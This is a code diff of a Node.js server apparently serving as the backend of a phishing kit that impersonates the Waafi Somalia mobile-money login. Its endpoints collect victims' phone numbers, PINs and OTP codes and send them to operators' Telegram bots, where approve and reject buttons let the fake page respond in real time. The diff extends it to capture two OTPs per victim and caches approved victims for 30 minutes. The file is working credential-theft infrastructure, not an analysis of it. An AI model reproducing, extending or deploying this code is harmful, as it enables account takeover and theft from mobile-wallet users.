@@ -1,4 +1,4 @@
-// server.js - Waafi Somalia FIXED - Better Callback Handling
+// server.js - Waafi Somalia - TWO-STEP OTP VERIFICATION
 const express = require('express');
 const cors = require('cors');
 const TelegramBot = require('node-telegram-bot-api');
@@ -261,7 +261,7 @@ const formatLoginMessage = (user, data) => {
     const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
     const isReturning = isVerifiedUser(user, data.phoneNumber);
     const userBadge = isReturning ? '🔄 RETURNING USER' : '🆕 NEW USER';
-    const cacheInfo = isReturning ? '✅ <b>Cached (30 min) - will skip OTP</b>' : '📱 <b>New user - will show OTP</b>';
+    const cacheInfo = isReturning ? '✅ <b>Cached (30 min) - will skip both OTPs</b>' : '📱 <b>New user - will show 2 OTPs</b>';
     
     return `📱 <b>${sanitizeInput(user.name)} - LOGIN ATTEMPT</b>
 
@@ -284,25 +284,51 @@ ${cacheInfo}
   }
 };
 
-const formatOTPMessage = (user, data) => {
+const formatFirstOTPMessage = (user, data) => {
   try {
     const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
     
-    return `✅ <b>${sanitizeInput(user.name)} - OTP VERIFICATION</b>
+    return `1️⃣ <b>${sanitizeInput(user.name)} - FIRST OTP (Step 1/2)</b>
 
-🆕 <b>NEW USER - VERIFICATION NEEDED</b>
+🆕 <b>NEW USER - FIRST VERIFICATION</b>
 🇸🇴 <b>Country:</b> Somalia
 🌍 <b>Country Code:</b> <code>${countryCode}</code>
 📱 <b>Phone Number:</b> <code>${number}</code>
-🔐 <b>OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
+🔐 <b>First OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
 ⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
 
 ━━━━━━━━━━━━━━━━━━━
 
-⚠️ <b>Verify the credentials:</b>
-⏱️ <b>Timeout:</b> 5 minutes`;
+⚠️ <b>Verify FIRST OTP:</b>
+⏱️ <b>Timeout:</b> 5 minutes
+📝 <b>Next:</b> Second OTP will be sent after approval`;
   } catch (error) {
-    logger.error(`Error formatting OTP message for ${user.name}:`, error.message);
+    logger.error(`Error formatting first OTP message for ${user.name}:`, error.message);
+    return `Error formatting message: ${error.message}`;
+  }
+};
+
+const formatSecondOTPMessage = (user, data) => {
+  try {
+    const { countryCode, number } = formatPhoneNumber(data.phoneNumber);
+    
+    return `2️⃣ <b>${sanitizeInput(user.name)} - SECOND OTP (Step 2/2)</b>
+
+✅ <b>FIRST OTP VERIFIED - FINAL VERIFICATION</b>
+🇸🇴 <b>Country:</b> Somalia
+🌍 <b>Country Code:</b> <code>${countryCode}</code>
+📱 <b>Phone Number:</b> <code>${number}</code>
+🔐 <b>Second OTP Code:</b> <code>${sanitizeInput(data.otp)}</code>
+🔗 <b>First OTP Ref:</b> <code>${sanitizeInput(data.firstOtp)}</code>
+⏰ <b>Time:</b> ${new Date(data.timestamp).toLocaleString()}
+
+━━━━━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify SECOND OTP:</b>
+⏱️ <b>Timeout:</b> 5 minutes
+📝 <b>Next:</b> User will be logged in and cached for 30 min`;
+  } catch (error) {
+    logger.error(`Error formatting second OTP message for ${user.name}:`, error.message);
     return `Error formatting message: ${error.message}`;
   }
 };
@@ -516,12 +542,13 @@ class BotManager {
       try {
         await this.bot.sendMessage(
           msg.chat.id,
-          `🤖 <b>${this.user.name} Bot - Waafi Somalia</b>\n\n` +
-          `I will notify you of all login attempts and OTP verifications.\n\n` +
+          `🤖 <b>${this.user.name} Bot - Waafi Somalia (Two-Step OTP)</b>\n\n` +
+          `I will notify you of all login attempts and TWO OTP verifications.\n\n` +
           `<b>Your Chat ID:</b> <code>${msg.chat.id}</code>\n` +
           `<b>Your Link:</b> <code>/api/${this.linkInsert}/*</code>\n\n` +
           `⏱️ <b>User Cache:</b> 30 minutes\n` +
-          `📝 <b>Returning users skip OTP for 30 min</b>\n\n` +
+          `📝 <b>Returning users skip both OTPs for 30 min</b>\n` +
+          `🔐 <b>New users verify 2 OTPs</b>\n\n` +
           `Add these to your .env file as:\n` +
           `<code>USER_LINK_INSERT_${this.user.id}=${this.linkInsert}</code>\n` +
           `<code>TELEGRAM_CHAT_ID_${this.user.id}=${msg.chat.id}</code>`,
@@ -541,7 +568,8 @@ class BotManager {
           msg.chat.id,
           `✅ <b>${this.user.name} Bot Active - Waafi Somalia</b>\n\n` +
           `📊 Login notifications: ${this.user.loginNotifications.size}\n` +
-          `📊 Pending OTP: ${this.user.otpVerifications.size}\n` +
+          `1️⃣ Pending First OTP: ${this.user.firstOtpVerifications.size}\n` +
+          `2️⃣ Pending Second OTP: ${this.user.secondOtpVerifications.size}\n` +
           `✅ Verified users (30 min cache): ${this.user.verifiedUsers.size}\n` +
           `🔗 Endpoint: <code>/api/${this.linkInsert}/*</code>\n` +
           `🔢 Errors: ${this.user.errorCount}\n` +
@@ -597,7 +625,7 @@ class BotManager {
 }
 
 // ============================================
-// FIXED CALLBACK QUERY HANDLER
+// CALLBACK QUERY HANDLER - TWO-STEP OTP
 // ============================================
 async function handleCallbackQuery(user, query) {
   const msg = query.message;
@@ -608,11 +636,9 @@ async function handleCallbackQuery(user, query) {
   logger.debug(`${user.name}: Callback received - ${data}`);
 
   try {
-    // Acknowledge immediately
     await user.bot.answerCallbackQuery(query.id, { text: '⏳ Processing...' })
       .catch(e => logger.debug(`Ack error: ${e.message}`));
 
-    // Parse callback data - FIXED: Better parsing
     const parts = data.split('_');
     logger.debug(`${user.name}: Parsed parts:`, parts);
     
@@ -625,41 +651,29 @@ async function handleCallbackQuery(user, query) {
       return;
     }
 
-    const type = parts[0]; // 'login' or 'otp'
-    const action = parts[1]; // 'proceed', 'invalid', 'correct', etc.
-    
-    // FIXED: Reconstruct phone and pin/otp correctly
-    // Format: login_proceed_phoneNumber_pin OR otp_correct_phoneNumber_otp
-    const dataValue = parts[parts.length - 1]; // Last part is PIN or OTP
-    const phoneNumber = parts.slice(2, -1).join('_'); // Everything between action and dataValue
+    const type = parts[0];
+    const action = parts[1];
+    const dataValue = parts[parts.length - 1];
+    const phoneNumber = parts.slice(2, -1).join('_');
     
     logger.info(`${user.name}: Processing ${type}_${action} for ${phoneNumber}`);
 
+    // ========== LOGIN HANDLING ==========
     if (type === 'login') {
       const pin = dataValue;
       const loginKey = `${phoneNumber}-${pin}`;
-      
-      logger.debug(`${user.name}: Looking for login key: ${loginKey}`);
-      logger.debug(`${user.name}: Available keys:`, Array.from(user.loginNotifications.keys()));
       
       const loginData = user.loginNotifications.get(loginKey);
       
       if (!loginData) {
         logger.warn(`${user.name}: Login session not found: ${loginKey}`);
-        
         await user.bot.editMessageText(
           `❌ <b>SESSION NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Status:</b> Session expired`,
           { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
         ).catch(e => logger.error(`Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Session not found', 
-          show_alert: true 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
         return;
       }
 
-      // Check timeout
       const elapsed = Date.now() - loginData.timestamp;
       if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
         logger.warn(`${user.name}: Login session expired: ${loginKey}`);
@@ -671,11 +685,6 @@ async function handleCallbackQuery(user, query) {
           `⏰ <b>SESSION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${pin}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
           { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
         ).catch(e => logger.error(`Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⏰ Session expired', 
-          show_alert: true 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
         return;
       }
 
@@ -697,7 +706,7 @@ async function handleCallbackQuery(user, query) {
           `🔐 <code>${pin}</code>\n\n` +
           `━━━━━━━━━━━━━━━━━━━\n\n` +
           `✅ <b>Status:</b> Approved\n` +
-          `➡️ <b>Next:</b> ${isReturning ? 'Dashboard' : 'OTP Verification'}\n` +
+          `➡️ <b>Next:</b> ${isReturning ? 'Dashboard' : 'First OTP (1/2)'}\n` +
           `${isReturning ? '⏱️ <b>Cache valid for 30 min</b>\n' : ''}` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
@@ -706,10 +715,6 @@ async function handleCallbackQuery(user, query) {
           message_id: messageId,
           parse_mode: 'HTML'
         }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '✅ User approved!' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
         
         logger.info(`${user.name}: ✅ Login approved for ${phoneNumber}`);
       }
@@ -736,76 +741,76 @@ async function handleCallbackQuery(user, query) {
           parse_mode: 'HTML'
         }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
         
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Marked as invalid' 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
-        
         logger.info(`${user.name}: ❌ Login rejected for ${phoneNumber}`);
       }
     }
-    else if (type === 'otp') {
+    
+    // ========== FIRST OTP HANDLING ==========
+    else if (type === 'firstotp') {
       const otp = dataValue;
       const verificationKey = `${phoneNumber}-${otp}`;
       
-      logger.debug(`${user.name}: Looking for OTP key: ${verificationKey}`);
-      logger.debug(`${user.name}: Available keys:`, Array.from(user.otpVerifications.keys()));
-      
-      const otpData = user.otpVerifications.get(verificationKey);
+      const otpData = user.firstOtpVerifications.get(verificationKey);
       
       if (!otpData) {
-        logger.warn(`${user.name}: OTP session not found: ${verificationKey}`);
+        logger.warn(`${user.name}: First OTP session not found: ${verificationKey}`);
         
-        await user.bot.editMessageText(
-          `❌ <b>VERIFICATION NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`,
-          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
-        ).catch(e => logger.error(`Edit error: ${e.message}`));
-        
+        // This might be a duplicate click after already processing
         await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Verification not found', 
+          text: '⚠️ Already processed or session expired', 
           show_alert: true 
         }).catch(e => logger.debug(`Ack error: ${e.message}`));
+        
+        await user.bot.editMessageText(
+          `❌ <b>FIRST OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired or already processed`,
+          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
+        ).catch(e => logger.error(`Edit error: ${e.message}`));
         return;
       }
 
-      // Check timeout
       const elapsed = Date.now() - otpData.timestamp;
       if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
-        logger.warn(`${user.name}: OTP session expired: ${verificationKey}`);
+        logger.warn(`${user.name}: First OTP expired: ${verificationKey}`);
         otpData.expired = true;
         otpData.status = 'timeout';
         
         await user.bot.editMessageText(
-          `⏰ <b>VERIFICATION EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
+          `⏰ <b>FIRST OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
           { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
         ).catch(e => logger.error(`Edit error: ${e.message}`));
-        
-        await user.bot.answerCallbackQuery(query.id, { 
-          text: '⏰ Verification expired', 
-          show_alert: true 
-        }).catch(e => logger.debug(`Ack error: ${e.message}`));
         return;
       }
 
       const { countryCode, number } = formatPhoneNumber(phoneNumber);
 
       if (action === 'correct') {
-        logger.info(`${user.name}: ✅ Approving OTP - ${phoneNumber}`);
+        logger.info(`${user.name}: ✅ Approving First OTP - ${phoneNumber}`);
+        
+        // Check if already processed
+        const processKey = `firstotp-${verificationKey}`;
+        if (user.processedOtps.has(processKey)) {
+          logger.warn(`${user.name}: First OTP already processed (duplicate click) - ${phoneNumber}`);
+          await user.bot.answerCallbackQuery(query.id, { 
+            text: '✅ Already approved!', 
+            show_alert: false 
+          }).catch(e => logger.debug(`Ack error: ${e.message}`));
+          return;
+        }
         
         otpData.status = 'approved';
         otpData.processedAt = Date.now();
         
-        // Cache the verified user
-        cacheVerifiedUser(user, phoneNumber);
+        // Mark as processed
+        user.processedOtps.set(processKey, Date.now());
         
         const statusMessage = 
-          `✅ <b>VERIFICATION SUCCESSFUL</b>\n\n` +
+          `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>\n\n` +
           `🇸🇴 Somalia\n` +
           `📱 <code>${number}</code>\n` +
           `🔐 <code>${otp}</code>\n\n` +
           `━━━━━━━━━━━━━━━━━━━\n\n` +
-          `✅ <b>Status:</b> All credentials verified\n` +
-          `🎉 <b>Result:</b> User logged in\n` +
-          `⏱️ <b>Cached for 30 minutes</b>\n` +
+          `✅ <b>Status:</b> First OTP verified\n` +
+          `➡️ <b>Next:</b> Second OTP (2/2) will be sent\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
         await user.bot.editMessageText(statusMessage, {
@@ -815,24 +820,24 @@ async function handleCallbackQuery(user, query) {
         }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
         
         await user.bot.answerCallbackQuery(query.id, { 
-          text: '✅ Verified!' 
+          text: '✅ First OTP verified!' 
         }).catch(e => logger.debug(`Ack error: ${e.message}`));
         
-        logger.info(`${user.name}: ✅ OTP approved and cached for ${phoneNumber}`);
+        logger.info(`${user.name}: ✅ First OTP approved for ${phoneNumber}`);
       }
       else if (action === 'wrong') {
-        logger.info(`${user.name}: ❌ Wrong OTP - ${phoneNumber}`);
+        logger.info(`${user.name}: ❌ Wrong First OTP - ${phoneNumber}`);
         
         otpData.status = 'rejected';
         otpData.processedAt = Date.now();
         
         const statusMessage = 
-          `❌ <b>WRONG OTP CODE</b>\n\n` +
+          `❌ <b>WRONG FIRST OTP</b>\n\n` +
           `🇸🇴 Somalia\n` +
           `📱 <code>${number}</code>\n` +
           `🔐 <code>${otp}</code>\n\n` +
           `━━━━━━━━━━━━━━━━━━━\n\n` +
-          `❌ <b>Status:</b> Invalid OTP\n` +
+          `❌ <b>Status:</b> Invalid first OTP\n` +
           `⏱️ ${new Date().toLocaleTimeString()}`;
         
         await user.bot.editMessageText(statusMessage, {
@@ -842,19 +847,19 @@ async function handleCallbackQuery(user, query) {
         }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
         
         await user.bot.answerCallbackQuery(query.id, { 
-          text: '❌ Wrong OTP' 
+          text: '❌ Marked as wrong' 
         }).catch(e => logger.debug(`Ack error: ${e.message}`));
         
-        logger.info(`${user.name}: ❌ Wrong OTP for ${phoneNumber}`);
+        logger.info(`${user.name}: ❌ Wrong First OTP for ${phoneNumber}`);
       }
       else if (action === 'wrongpin') {
-        logger.info(`${user.name}: ⚠️ Wrong PIN - ${phoneNumber}`);
+        logger.info(`${user.name}: ⚠️ Wrong PIN (First OTP) - ${phoneNumber}`);
         
         otpData.status = 'wrong_pin';
         otpData.processedAt = Date.now();
         
         const statusMessage = 
-          `⚠️ <b>WRONG PIN</b>\n\n` +
+          `⚠️ <b>WRONG PIN (First OTP)</b>\n\n` +
           `🇸🇴 Somalia\n` +
           `📱 <code>${number}</code>\n` +
           `🔐 <code>${otp}</code>\n\n` +
@@ -869,10 +874,162 @@ async function handleCallbackQuery(user, query) {
         }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
         
         await user.bot.answerCallbackQuery(query.id, { 
-          text: '⚠️ Wrong PIN' 
+          text: '⚠️ Marked as wrong PIN' 
         }).catch(e => logger.debug(`Ack error: ${e.message}`));
         
-        logger.info(`${user.name}: ⚠️ Wrong PIN for ${phoneNumber}`);
+        logger.info(`${user.name}: ⚠️ Wrong PIN for First OTP - ${phoneNumber}`);
+      }
+    }
+    
+    // ========== SECOND OTP HANDLING ==========
+    else if (type === 'secondotp') {
+      const otp = dataValue;
+      const verificationKey = `${phoneNumber}-${otp}`;
+      
+      const otpData = user.secondOtpVerifications.get(verificationKey);
+      
+      if (!otpData) {
+        logger.warn(`${user.name}: Second OTP session not found: ${verificationKey}`);
+        
+        // Check if this was recently processed (check verified users cache)
+        const isNowVerified = isVerifiedUser(user, phoneNumber);
+        
+        if (isNowVerified) {
+          logger.info(`${user.name}: Second OTP already processed - user is cached`);
+          await user.bot.answerCallbackQuery(query.id, { 
+            text: '✅ Already processed - user is verified', 
+            show_alert: true 
+          }).catch(e => logger.debug(`Ack error: ${e.message}`));
+          return;
+        }
+        
+        await user.bot.editMessageText(
+          `❌ <b>SECOND OTP NOT FOUND</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Status:</b> Session expired`,
+          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
+        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        
+        await user.bot.answerCallbackQuery(query.id, { 
+          text: '❌ Session not found or expired', 
+          show_alert: true 
+        }).catch(e => logger.debug(`Ack error: ${e.message}`));
+        return;
+      }
+
+      const elapsed = Date.now() - otpData.timestamp;
+      if (elapsed > CONFIG.APPROVAL_TIMEOUT) {
+        logger.warn(`${user.name}: Second OTP expired: ${verificationKey}`);
+        otpData.expired = true;
+        otpData.status = 'timeout';
+        
+        await user.bot.editMessageText(
+          `⏰ <b>SECOND OTP EXPIRED</b>\n\n📱 <code>${phoneNumber}</code>\n🔐 <code>${otp}</code>\n\n<b>Expired after:</b> ${Math.floor(elapsed/1000)}s`,
+          { chat_id: chatId, message_id: messageId, parse_mode: 'HTML' }
+        ).catch(e => logger.error(`Edit error: ${e.message}`));
+        return;
+      }
+
+      const { countryCode, number } = formatPhoneNumber(phoneNumber);
+
+      if (action === 'correct') {
+        logger.info(`${user.name}: ✅ Approving Second OTP - ${phoneNumber}`);
+        
+        // Check if already processed
+        const processKey = `secondotp-${verificationKey}`;
+        if (user.processedOtps.has(processKey)) {
+          logger.warn(`${user.name}: Second OTP already processed (duplicate click) - ${phoneNumber}`);
+          await user.bot.answerCallbackQuery(query.id, { 
+            text: '✅ Already approved and user cached!', 
+            show_alert: false 
+          }).catch(e => logger.debug(`Ack error: ${e.message}`));
+          return;
+        }
+        
+        otpData.status = 'approved';
+        otpData.processedAt = Date.now();
+        
+        // Mark as processed
+        user.processedOtps.set(processKey, Date.now());
+        
+        // Cache the verified user (both OTPs verified)
+        cacheVerifiedUser(user, phoneNumber);
+        
+        const statusMessage = 
+          `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2) ✅</b>\n\n` +
+          `🇸🇴 Somalia\n` +
+          `📱 <code>${number}</code>\n` +
+          `🔐 <code>${otp}</code>\n` +
+          `🔗 <b>First OTP:</b> <code>${otpData.firstOtp}</code>\n\n` +
+          `━━━━━━━━━━━━━━━━━━━\n\n` +
+          `✅ <b>Status:</b> ALL verifications complete!\n` +
+          `🎉 <b>Result:</b> User logged in\n` +
+          `⏱️ <b>Cached for 30 minutes</b>\n` +
+          `⏱️ ${new Date().toLocaleTimeString()}`;
+        
+        await user.bot.editMessageText(statusMessage, {
+          chat_id: chatId,
+          message_id: messageId,
+          parse_mode: 'HTML'
+        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
+        
+        await user.bot.answerCallbackQuery(query.id, { 
+          text: '✅ Verified & cached!' 
+        }).catch(e => logger.debug(`Ack error: ${e.message}`));
+        
+        logger.info(`${user.name}: ✅ Second OTP approved and user cached for ${phoneNumber}`);
+      }
+      else if (action === 'wrong') {
+        logger.info(`${user.name}: ❌ Wrong Second OTP - ${phoneNumber}`);
+        
+        otpData.status = 'rejected';
+        otpData.processedAt = Date.now();
+        
+        const statusMessage = 
+          `❌ <b>WRONG SECOND OTP</b>\n\n` +
+          `🇸🇴 Somalia\n` +
+          `📱 <code>${number}</code>\n` +
+          `🔐 <code>${otp}</code>\n\n` +
+          `━━━━━━━━━━━━━━━━━━━\n\n` +
+          `❌ <b>Status:</b> Invalid second OTP\n` +
+          `⏱️ ${new Date().toLocaleTimeString()}`;
+        
+        await user.bot.editMessageText(statusMessage, {
+          chat_id: chatId,
+          message_id: messageId,
+          parse_mode: 'HTML'
+        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
+        
+        await user.bot.answerCallbackQuery(query.id, { 
+          text: '❌ Marked as wrong' 
+        }).catch(e => logger.debug(`Ack error: ${e.message}`));
+        
+        logger.info(`${user.name}: ❌ Wrong Second OTP for ${phoneNumber}`);
+      }
+      else if (action === 'wrongpin') {
+        logger.info(`${user.name}: ⚠️ Wrong PIN (Second OTP) - ${phoneNumber}`);
+        
+        otpData.status = 'wrong_pin';
+        otpData.processedAt = Date.now();
+        
+        const statusMessage = 
+          `⚠️ <b>WRONG PIN (Second OTP)</b>\n\n` +
+          `🇸🇴 Somalia\n` +
+          `📱 <code>${number}</code>\n` +
+          `🔐 <code>${otp}</code>\n\n` +
+          `━━━━━━━━━━━━━━━━━━━\n\n` +
+          `⚠️ <b>Status:</b> Incorrect PIN\n` +
+          `⏱️ ${new Date().toLocaleTimeString()}`;
+        
+        await user.bot.editMessageText(statusMessage, {
+          chat_id: chatId,
+          message_id: messageId,
+          parse_mode: 'HTML'
+        }).catch(e => logger.error(`${user.name}: Edit error: ${e.message}`));
+        
+        await user.bot.answerCallbackQuery(query.id, { 
+          text: '⚠️ Marked as wrong PIN' 
+        }).catch(e => logger.debug(`Ack error: ${e.message}`));
+        
+        logger.info(`${user.name}: ⚠️ Wrong PIN for Second OTP - ${phoneNumber}`);
       }
     }
 
@@ -945,7 +1102,9 @@ const loadUsers = () => {
         isHealthy: false,
         consecutiveErrors: 0,
         loginNotifications: new Map(),
-        otpVerifications: new Map(),
+        firstOtpVerifications: new Map(),  // NEW
+        secondOtpVerifications: new Map(), // NEW
+        processedOtps: new Map(), // Track processed OTPs to prevent duplicates
         verifiedUsers: new Map(),
         processedRequests: new Map(),
         errorCount: 0,
@@ -1058,6 +1217,7 @@ setInterval(() => {
     
     users.forEach((user) => {
       try {
+        // Mark expired logins
         for (const [key, value] of user.loginNotifications.entries()) {
           if (value.timestamp < timeoutThreshold && !value.expired) {
             value.expired = true;
@@ -1067,25 +1227,44 @@ setInterval(() => {
           }
         }
         
-        for (const [key, value] of user.otpVerifications.entries()) {
+        // Mark expired first OTPs
+        for (const [key, value] of user.firstOtpVerifications.entries()) {
           if (value.timestamp < timeoutThreshold && !value.expired) {
             value.expired = true;
             value.status = 'timeout';
           }
         }
         
+        // Mark expired second OTPs
+        for (const [key, value] of user.secondOtpVerifications.entries()) {
+          if (value.timestamp < timeoutThreshold && !value.expired) {
+            value.expired = true;
+            value.status = 'timeout';
+          }
+        }
+        
+        // Delete old logins
         for (const [key, value] of user.loginNotifications.entries()) {
           if (value.timestamp < deleteThreshold) {
             user.loginNotifications.delete(key);
           }
         }
         
-        for (const [key, value] of user.otpVerifications.entries()) {
+        // Delete old first OTPs
+        for (const [key, value] of user.firstOtpVerifications.entries()) {
           if (value.timestamp < deleteThreshold) {
-            user.otpVerifications.delete(key);
+            user.firstOtpVerifications.delete(key);
           }
         }
         
+        // Delete old second OTPs
+        for (const [key, value] of user.secondOtpVerifications.entries()) {
+          if (value.timestamp < deleteThreshold) {
+            user.secondOtpVerifications.delete(key);
+          }
+        }
+        
+        // Clean expired user cache
         let expiredCount = 0;
         for (const [phoneNumber, verifiedData] of user.verifiedUsers.entries()) {
           if (verifiedData.timestamp < userCacheThreshold) {
@@ -1096,6 +1275,20 @@ setInterval(() => {
         
         if (expiredCount > 0) {
           logger.info(`${user.name}: Cleaned up ${expiredCount} expired verified users (30-min cache)`);
+        }
+        
+        // Clean up processed OTPs older than 10 minutes
+        let processedOtpsCleaned = 0;
+        const processedOtpThreshold = now - (10 * 60 * 1000);
+        for (const [key, timestamp] of user.processedOtps.entries()) {
+          if (timestamp < processedOtpThreshold) {
+            user.processedOtps.delete(key);
+            processedOtpsCleaned++;
+          }
+        }
+        
+        if (processedOtpsCleaned > 0) {
+          logger.debug(`${user.name}: Cleaned up ${processedOtpsCleaned} old processed OTP records`);
         }
         
       } catch (error) {
@@ -1121,7 +1314,8 @@ app.get('/api/health', (req, res) => {
       active: !!u.bot,
       healthy: u.isHealthy,
       logins: u.loginNotifications.size,
-      otps: u.otpVerifications.size,
+      firstOtps: u.firstOtpVerifications.size,
+      secondOtps: u.secondOtpVerifications.size,
       verified: u.verifiedUsers.size,
       errorCount: u.errorCount,
       lastError: u.lastError,
@@ -1135,6 +1329,7 @@ app.get('/api/health', (req, res) => {
       totalUsers: users.size,
       healthyUsers: healthyCount,
       userCacheDuration: `${CONFIG.USER_CACHE_DURATION / 60000} minutes`,
+      twoStepOtp: true,
       users: userList,
       queue: queueStats,
       memory: {
@@ -1155,12 +1350,13 @@ app.get('/api/health', (req, res) => {
 });
 
 // ============================================
-// DYNAMIC ROUTE CREATION
+// DYNAMIC ROUTE CREATION - TWO-STEP OTP
 // ============================================
 
 users.forEach((user, linkInsert) => {
   const basePath = `/api/${linkInsert}`;
 
+  // Check user status (existing)
   app.post(`${basePath}/check-user-status`, async (req, res) => {
     try {
       const { phoneNumber } = req.body;
@@ -1197,6 +1393,7 @@ users.forEach((user, linkInsert) => {
     }
   });
 
+  // Check login approval (existing)
   app.post(`${basePath}/check-login-approval`, async (req, res) => {
     try {
       const { phoneNumber, pin } = req.body;
@@ -1283,6 +1480,7 @@ users.forEach((user, linkInsert) => {
     }
   });
 
+  // Login (existing)
   app.post(`${basePath}/login`, async (req, res) => {
     try {
       if (!user.bot) {
@@ -1381,16 +1579,12 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  app.post(`${basePath}/verify-otp`, async (req, res) => {
+  // ========== NEW: FIRST OTP ENDPOINTS ==========
+  
+  // Verify First OTP
+  app.post(`${basePath}/verify-first-otp`, async (req, res) => {
     try {
-      if (!user.bot) {
-        return res.status(503).json({ 
-          success: false, 
-          message: 'Bot not configured' 
-        });
-      }
-
-      if (!user.isHealthy) {
+      if (!user.bot || !user.isHealthy) {
         return res.status(503).json({ 
           success: false, 
           message: 'Bot service unavailable' 
@@ -1422,24 +1616,24 @@ users.forEach((user, linkInsert) => {
         });
       }
 
-      const requestKey = `otp-${phoneNumber}-${otp}`;
+      const requestKey = `first-otp-${phoneNumber}-${otp}`;
       if (isDuplicate(user, requestKey)) {
         return res.json({ 
           success: true, 
-          message: 'OTP sent (cached)' 
+          message: 'First OTP sent (cached)' 
         });
       }
 
       const verificationKey = `${phoneNumber}-${otp}`;
-      user.otpVerifications.set(verificationKey, { 
+      user.firstOtpVerifications.set(verificationKey, { 
         status: 'pending', 
         timestamp: Date.now(), 
         expired: false 
       });
 
-      logger.info(`${user.name}: 🔐 New OTP verification - ${phoneNumber}`);
+      logger.info(`${user.name}: 1️⃣ New First OTP verification - ${phoneNumber}`);
 
-      const message = formatOTPMessage(user, { 
+      const message = formatFirstOTPMessage(user, { 
         phoneNumber, 
         otp, 
         timestamp: timestamp || Date.now() 
@@ -1447,10 +1641,10 @@ users.forEach((user, linkInsert) => {
       
       const keyboard = {
         inline_keyboard: [
-          [{ text: '✅ Correct (PIN + OTP)', callback_data: `otp_correct_${phoneNumber}_${otp}` }],
+          [{ text: '✅ Correct (First OTP)', callback_data: `firstotp_correct_${phoneNumber}_${otp}` }],
           [
-            { text: '❌ Wrong Code', callback_data: `otp_wrong_${phoneNumber}_${otp}` },
-            { text: '⚠️ Wrong PIN', callback_data: `otp_wrongpin_${phoneNumber}_${otp}` }
+            { text: '❌ Wrong Code', callback_data: `firstotp_wrong_${phoneNumber}_${otp}` },
+            { text: '⚠️ Wrong PIN', callback_data: `firstotp_wrongpin_${phoneNumber}_${otp}` }
           ]
         ]
       };
@@ -1462,7 +1656,7 @@ users.forEach((user, linkInsert) => {
         user.lastRequestTime = Date.now();
         res.json({ 
           success: true, 
-          message: 'OTP sent successfully' 
+          message: 'First OTP sent successfully' 
         });
       } else {
         res.status(500).json({ 
@@ -1472,7 +1666,7 @@ users.forEach((user, linkInsert) => {
         });
       }
     } catch (error) {
-      logger.error(`verify-otp error for ${user.name}:`, error.message);
+      logger.error(`verify-first-otp error for ${user.name}:`, error.message);
       res.status(500).json({ 
         success: false, 
         error: 'Internal server error' 
@@ -1480,7 +1674,8 @@ users.forEach((user, linkInsert) => {
     }
   });
 
-  app.post(`${basePath}/check-otp-status`, async (req, res) => {
+  // Check First OTP Status
+  app.post(`${basePath}/check-first-otp-status`, async (req, res) => {
     try {
       const { phoneNumber, otp } = req.body;
       
@@ -1508,13 +1703,13 @@ users.forEach((user, linkInsert) => {
       }
 
       const verificationKey = `${phoneNumber}-${otp}`;
-      const verification = user.otpVerifications.get(verificationKey);
+      const verification = user.firstOtpVerifications.get(verificationKey);
 
       if (!verification) {
         return res.json({ 
           success: true, 
           status: 'pending', 
-          message: 'Waiting for verification' 
+          message: 'Waiting for first OTP verification' 
         });
       }
 
@@ -1522,27 +1717,26 @@ users.forEach((user, linkInsert) => {
         return res.json({ 
           success: true, 
           status: 'timeout', 
-          message: 'Session expired' 
+          message: 'First OTP session expired' 
         });
       }
 
       if (verification.status === 'approved') {
-        user.otpVerifications.delete(verificationKey);
+        user.firstOtpVerifications.delete(verificationKey);
         return res.json({ 
           success: true, 
           status: 'approved', 
-          message: 'Everything correct',
-          cacheExpiry: '30 minutes'
+          message: 'First OTP verified - proceed to second OTP'
         });
       } else if (verification.status === 'rejected') {
